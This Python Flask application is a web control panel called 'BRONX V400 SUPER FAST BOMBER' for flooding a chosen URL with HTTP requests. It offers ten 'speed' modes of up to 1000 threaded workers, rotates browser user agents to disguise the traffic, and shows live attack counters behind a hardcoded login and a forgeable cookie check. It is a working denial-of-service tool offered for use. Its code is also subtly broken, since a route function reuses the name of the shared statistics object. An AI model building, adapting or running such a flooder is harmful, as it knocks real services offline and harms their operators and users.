from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings()
app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ========== GLOBAL ATTACK STATS ==========
class AttackStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.success = 0
        self.failed = 0
        self.total = 0
        self.lt_success = 0
        self.lt_failed = 0
        self.lt_total = 0
        self.active_attacks = {}
        self.attack_logs = []
    
    def add_success(self, count=1):
        with self.lock:
            self.success += count
            self.total += count
            self.lt_success += count
            self.lt_total += count
    
    def add_failed(self, count=1):
        with self.lock:
            self.failed += count
            self.total += count
            self.lt_failed += count
            self.lt_total += count
    
    def reset_session(self):
        with self.lock:
            self.success = 0
            self.failed = 0
            self.total = 0
    
    def get_stats(self):
        with self.lock:
            return {
                "success": self.success,
                "failed": self.failed,
                "total": self.total,
                "lt_success": self.lt_success,
                "lt_failed": self.lt_failed,
                "lt_total": self.lt_total,
                "active": len(self.active_attacks)
            }

stats = AttackStats()
multi_session_enabled = False
session_pool = []

# ========== SPEED CONFIGS (10 ATTACK SLOTS) ==========
SPEED_CONFIGS = {
    "slow": {"workers": 50, "timeout": 10, "desc": "🐢 SLOW (50 workers)"},
    "medium": {"workers": 100, "timeout": 8, "desc": "⚡ MEDIUM (100 workers)"},
    "fast": {"workers": 200, "timeout": 6, "desc": "🔥 FAST (200 workers)"},
    "veryfast": {"workers": 300, "timeout": 5, "desc": "💨 VERY FAST (300 workers)"},
    "ultra": {"workers": 400, "timeout": 4, "desc": "💀 ULTRA (400 workers)"},
    "lightning": {"workers": 500, "timeout": 3, "desc": "⚡ LIGHTNING (500 workers)"},
    "god": {"workers": 600, "timeout": 2, "desc": "👑 GOD (600 workers)"},
    "flash": {"workers": 700, "timeout": 1, "desc": "💎 FLASH (700 workers)"},
    "extreme": {"workers": 800, "timeout": 0.5, "desc": "💥 EXTREME (800 workers)"},
    "ultraflash": {"workers": 1000, "timeout": 0.1, "desc": "💀 ULTRA FLASH (1000 workers)"},
}

# ========== SESSION POOL ==========
def create_sessions(count=500):
    global session_pool
    session_pool = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    ]
    
    for _ in range(count):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(user_agents),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
        })
        session_pool.append(s)
    return len(session_pool)

# ========== ATTACK WORKER ==========
def attack_worker(attack_id, url, count, timeout, use_multi):
    for _ in range(count):
        if attack_id not in stats.active_attacks:
            return
        
        try:
            if use_multi and session_pool:
                s = random.choice(session_pool)
            else:
                s = requests.Session()
                s.headers.update({"User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                ])})
            
            resp = s.get(url, timeout=timeout, verify=False, allow_redirects=True)
            
            if resp.status_code < 500:
                stats.add_success(1)
            else:
                stats.add_failed(1)
        except:
            stats.add_failed(1)

def run_attack(attack_id, url, total_count, speed):
    config = SPEED_CONFIGS.get(speed, SPEED_CONFIGS["fast"])
    workers = config["workers"]
    timeout = config["timeout"]
    
    stats.attack_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] ⚡ START: {url} | {total_count} REQ | {speed.upper()} | {workers} WORKERS")
    
    per_worker = max(1, total_count // workers)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for _ in range(workers):
            futures.append(executor.submit(attack_worker, attack_id, url, per_worker, timeout, multi_session_enabled))
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if attack_id in stats.active_attacks:
        del stats.active_attacks[attack_id]
    
    current = stats.get_stats()
    stats.attack_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ DONE | S:{current['success']} F:{current['failed']} T:{current['total']}")

# ========== HTML TEMPLATES ==========
LOGIN_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V400</title>
<style>*{margin:0;padding:0;box-sizing:border-box}
body{background:#050010;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,rgba(255,0,85,0.08),transparent 60%),radial-gradient(ellipse at 80% 20%,rgba(0,200,255,0.05),transparent 50%),radial-gradient(ellipse at 20% 80%,rgba(255,215,0,0.04),transparent 50%);pointer-events:none;z-index:0}
.box{background:rgba(15,0,10,0.97);padding:50px 40px;border-radius:24px;border:2px solid rgba(255,0,85,0.2);width:440px;text-align:center;position:relative;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15),0 0 200px rgba(255,215,0,0.08)}
.logo{font-size:5em;animation:pulse 1.5s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
h1{font-size:2.5em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff,#fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;margin:8px 0}
.tag{color:#ff0055;font-size:0.7em;letter-spacing:6px;text-transform:uppercase;margin:8px 0;animation:glow 2s infinite}@keyframes glow{50%{text-shadow:0 0 20px #ff0055,0 0 40px #ff0055,0 0 60px #ff0055}}
.info{color:#888;font-size:0.55em;letter-spacing:2px;margin:6px 0}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,0,85,0.2);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.4);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:800;cursor:pointer;font-size:16px;margin-top:15px;letter-spacing:3px;transition:0.3s}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.8);transform:translateY(-3px)}</style></head><body>
<div class="box"><div class="logo">💀</div><h1>BRONX V400</h1><div class="tag">SUPER FAST BOMBER</div><div class="info">⚡ 10 SPEED MODES • 1000 WORKERS • REAL-TIME COUNTER ⚡</div>
<form method="post"><input type="text" name="user" placeholder="USERNAME"><input type="password" name="pass" placeholder="PASSWORD"><button class="btn" type="submit">☠️ ACCESS PANEL</button></form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}</div></body></html>"""

DASH_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V400 PANEL</title>
<style>*{margin:0;padding:0;box-sizing:border-box}
body{background:#050010;color:#e0e0e0;font-family:system-ui,sans-serif;padding:12px;min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(255,0,85,0.05),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,0.03),transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1500px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:16px 22px;border:1px solid rgba(255,0,85,0.2);border-radius:14px;margin-bottom:16px;background:rgba(255,0,85,0.03);animation:glow 3s infinite}@keyframes glow{50%{border-color:rgba(255,0,85,0.5);box-shadow:0 0 40px rgba(255,0,85,0.15)}}
.header h1{font-size:1.6em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;margin-bottom:14px}
.stat-card{background:rgba(255,0,85,0.03);border:1px solid rgba(255,0,85,0.12);border-radius:12px;padding:14px;text-align:center;transition:0.3s}
.stat-card:hover{border-color:#ff0055}
.stat-val{font-size:2em;font-weight:900}.sc{color:#00ff88}.fc{color:#ff0055}.tc{color:#ffd700}.bc{color:#00c8ff}.wc{color:#fff}
.stat-label{font-size:0.5em;text-transform:uppercase;letter-spacing:2px;color:#666;margin-top:2px}
.main-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:12px;margin-bottom:14px}
.card{background:rgba(255,0,85,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:12px;padding:18px}
.card h3{font-size:0.7em;font-weight:700;letter-spacing:3px;text-transform:uppercase;margin-bottom:12px;color:#ff0055}
input,select{width:100%;padding:10px 12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,0,85,0.12);border-radius:7px;color:#fff;margin:3px 0;font-size:12px;font-family:inherit;transition:0.2s}
input:focus,select:focus{border-color:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.2);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#888;display:block;margin-top:6px}
.btn{width:100%;padding:11px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:7px;font-weight:700;cursor:pointer;font-size:0.7em;letter-spacing:2px;text-transform:uppercase;margin:4px 0;transition:0.3s}
.btn:hover{box-shadow:0 0 35px rgba(255,0,85,0.6);transform:translateY(-2px)}
.btn-red{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-red:hover{box-shadow:0 0 25px rgba(255,0,0,0.4)}
.btn-green{background:rgba(0,255,136,0.12);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}
.btn-blue{background:rgba(0,200,255,0.12);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}
.row-2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.log-box{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.03);border-radius:8px;padding:12px;max-height:280px;overflow:auto;font-size:0.6em;font-family:monospace;color:#00ff88}
.log-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.01);color:#888}
.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:0.55em;letter-spacing:2px}.badge-on{background:rgba(0,255,136,0.15);color:#00ff88;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}.badge-off{background:rgba(255,0,0,0.12);color:#ff4444}
.toggle-row{display:flex;align-items:center;gap:10px;margin:8px 0}
.toggle{width:46px;height:26px;background:rgba(255,255,255,0.06);border-radius:13px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#00ff88;box-shadow:0 0 20px rgba(0,255,136,0.3)}.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:23px}
.ip-display{background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.15);border-radius:8px;padding:8px;text-align:center;font-size:1.1em;color:#ffd700;font-weight:700;margin:6px 0}
.speed-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
.speed-btn{padding:8px 6px;background:rgba(255,0,85,0.05);border:1px solid rgba(255,0,85,0.1);border-radius:6px;color:#fff;cursor:pointer;font-size:0.5em;text-align:center;transition:0.2s;font-family:inherit}
.speed-btn:hover,.speed-btn.active{border-color:#ff0055;background:rgba(255,0,85,0.12);color:#ffd700}
.footer{text-align:center;padding:12px;color:rgba(255,255,255,0.08);font-size:0.5em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header"><div><h1>💀 BRONX V400</h1><div style="color:#888;font-size:0.5em;letter-spacing:2px">SUPER FAST BOMBER • 10 SPEED MODES • REAL-TIME</div></div>
<div style="display:flex;gap:8px;align-items:center"><span style="color:#666;font-size:0.55em" id="clock"></span><a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.6em">⏏️ LOGOUT</a></div></div>

<div class="stats-grid">
<div class="stat-card"><div class="stat-val sc" id="vSuc">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat-card"><div class="stat-val fc" id="vFail">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat-card"><div class="stat-val tc" id="vTot">0</div><div class="stat-label">📊 SESSION</div></div>
<div class="stat-card"><div class="stat-val tc" id="vLTs">0</div><div class="stat-label">🏆 LT SUCCESS</div></div>
<div class="stat-card"><div class="stat-val tc" id="vLTt">0</div><div class="stat-label">📊 LT TOTAL</div></div>
<div class="stat-card"><div class="stat-val bc" id="vAct">0</div><div class="stat-label">🔗 ACTIVE</div></div>
</div>

<div class="main-grid">
<div class="card"><h3>🎯 10 ATTACK CONFIGS</h3>
<label>TARGET URL</label><input type="text" id="url1" placeholder="https://api.target.com/endpoint">
<div class="row-2"><div><label>REQUESTS</label><input type="number" id="count1" value="50000"></div><div><label>SPEED</label><select id="speed1">{% for k,v in speeds.items() %}<option value="{{k}}">{{v.desc}}</option>{% endfor %}</select></div></div>
<button class="btn" onclick="launch(1)">🚀 LAUNCH CONFIG 1</button>

<hr style="border-color:rgba(255,255,255,0.03);margin:10px 0">

<label>TARGET URL</label><input type="text" id="url2" placeholder="https://api.target2.com/">
<div class="row-2"><div><label>REQUESTS</label><input type="number" id="count2" value="50000"></div><div><label>SPEED</label><select id="speed2">{% for k,v in speeds.items() %}<option value="{{k}}">{{v.desc}}</option>{% endfor %}</select></div></div>
<button class="btn" onclick="launch(2)">🚀 LAUNCH CONFIG 2</button>

<button class="btn btn-red" onclick="stopAll()" style="margin-top:8px">⏹️ STOP ALL</button>
<button class="btn btn-blue" onclick="resetSession()" style="margin-top:4px">🔄 RESET COUNTERS</button>
<span id="statusBar" style="margin-top:6px;display:block;font-size:0.6em"></span>
</div>

<div class="card"><h3>🔗 MULTI-SESSION</h3>
<div class="toggle-row"><span style="font-size:0.6em;color:#888">MULTI-SESSION</span><div class="toggle" id="togMulti" onclick="toggleMulti()"></div><span id="labMulti" style="font-size:0.6em;color:#888">OFF</span></div>
<label>MAX SESSIONS</label><input type="number" id="maxSess" value="500" min="100" max="1000">
<button class="btn btn-green" onclick="saveMulti()">💾 CREATE SESSIONS</button>
<button class="btn btn-blue" onclick="resetSess()">🔄 RESET</button>
<div class="ip-display" id="myIP">Loading IP...</div>
<button class="btn btn-blue" onclick="copyIP()">📋 COPY IP</button>
<div style="margin-top:6px;color:#888;font-size:0.55em" id="sessInfo">Sessions: 0</div>
</div>
</div>

<div class="card"><h3>📜 ATTACK LOGS</h3>
<button class="btn btn-red" style="margin-bottom:6px" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
<div class="log-box" id="logBox"><div class="log-item">💀 BRONX V400 ready. Configure and LAUNCH!</div></div></div>
<div class="footer">💀 BRONX V400 • SUPER FAST BOMBER • 10 CONFIGS • REAL-TIME COUNTER 💀</div></div>

<script>
var multiOn=false;
function toggleMulti(){multiOn=!multiOn;document.getElementById('togMulti').classList.toggle('on',multiOn);var l=document.getElementById('labMulti');l.textContent=multiOn?'ON':'OFF';l.style.color=multiOn?'#00ff88':'#888'}
function saveMulti(){var max=document.getElementById('maxSess').value;fetch('/multi_config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,max:parseInt(max)})}).then(r=>r.json()).then(d=>{alert(d.status+' | Count: '+d.count);document.getElementById('sessInfo').textContent='Sessions: '+d.count})}
function resetSess(){fetch('/reset_sessions',{method:'POST'}).then(()=>{document.getElementById('sessInfo').textContent='Sessions: 0';refresh()})}
function resetSession(){fetch('/reset_stats',{method:'POST'}).then(()=>refresh())}
function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>refreshLogs())}
function stopAll(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('statusBar').innerHTML='<span class="badge badge-off">STOPPED</span>';refresh()})}
function copyIP(){var ip=document.getElementById('myIP').textContent;navigator.clipboard.writeText(ip);alert('IP Copied: '+ip)}
function launch(n){var url=document.getElementById('url'+n).value.trim();var count=parseInt(document.getElementById('count'+n).value);var speed=document.getElementById('speed'+n).value;if(!url){alert('Enter URL for Config '+n+'!');return};document.getElementById('statusBar').innerHTML='<span class="badge badge-on">CONFIG '+n+' ACTIVE</span>';fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url,count:count,speed:speed})}).then(r=>r.json()).then(()=>{refresh();refreshLogs()})}
function refresh(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('vSuc').textContent=d.success;document.getElementById('vFail').textContent=d.failed;document.getElementById('vTot').textContent=d.total;document.getElementById('vLTs').textContent=d.lt_success;document.getElementById('vLTt').textContent=d.lt_total;document.getElementById('vAct').textContent=d.active||0})}
function refreshLogs(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logBox').innerHTML=d.logs.map(x=>'<div class="log-item">'+x+'</div>').join('')})}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('myIP').textContent=d.ip})
setInterval(function(){refresh();refreshLogs();document.getElementById('clock').textContent=new Date().toLocaleTimeString()},500)
</script></body></html>"""

# ========== ROUTES ==========
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN_HTML, error="ACCESS DENIED!")
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH_HTML, speeds=SPEED_CONFIGS)

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','').strip()
    count = min(int(d.get('count',1000)), 10000000)
    speed = d.get('speed','fast')
    
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = str(int(time.time()*1000))
    stats.active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid, url, count, speed))
    t.daemon = True
    t.start()
    
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(stats.active_attacks.keys()): del stats.active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/reset_stats', methods=['POST'])
def reset_stats():
    stats.reset_session()
    return jsonify({"status":"reset"})

@app.route('/reset_sessions', methods=['POST'])
def reset_sessions():
    global session_pool
    session_pool = []
    return jsonify({"status":"reset"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    stats.attack_logs.clear()
    return jsonify({"status":"cleared"})

@app.route('/multi_config', methods=['POST'])
def multi_config():
    global multi_session_enabled
    d = request.get_json()
    multi_session_enabled = d.get('enabled',False)
    max_sess = min(int(d.get('max',500)), 1000)
    
    if multi_session_enabled:
        count = create_sessions(max_sess)
        return jsonify({"status":"CREATED","count":count})
    return jsonify({"status":"DISABLED","count":0})

@app.route('/logs')
def logs():
    return jsonify({"logs": stats.attack_logs[-50:] if stats.attack_logs else ["💀 Ready for attack..."]})

@app.route('/stats')
def stats():
    return jsonify(stats.get_stats())

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT',5000))
    print("💀 BRONX V400 SUPER FAST BOMBER READY!")
    app.run(host='0.0.0.0', port=port, threaded=True)
